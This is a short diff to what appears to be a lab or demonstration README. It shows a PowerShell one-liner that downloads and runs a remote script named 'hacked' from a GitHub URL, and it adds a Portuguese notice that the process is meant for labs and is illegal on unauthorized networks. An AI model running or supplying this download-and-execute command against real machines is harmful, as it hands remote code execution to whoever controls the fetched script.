@@ -16,4 +16,5 @@ powershell IEX (New-Object System.Net.WebClient).DownloadString('https://raw.git
 ```
 powershell IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/thiagosmith/desk/refs/heads/main/hacked')
 ```
-
+## Nota importante:
+### Esse processo é usado em ambientes de laboratório e para demonstrar vulnerabilidades. Em redes reais sem autorização, seria ilegal.
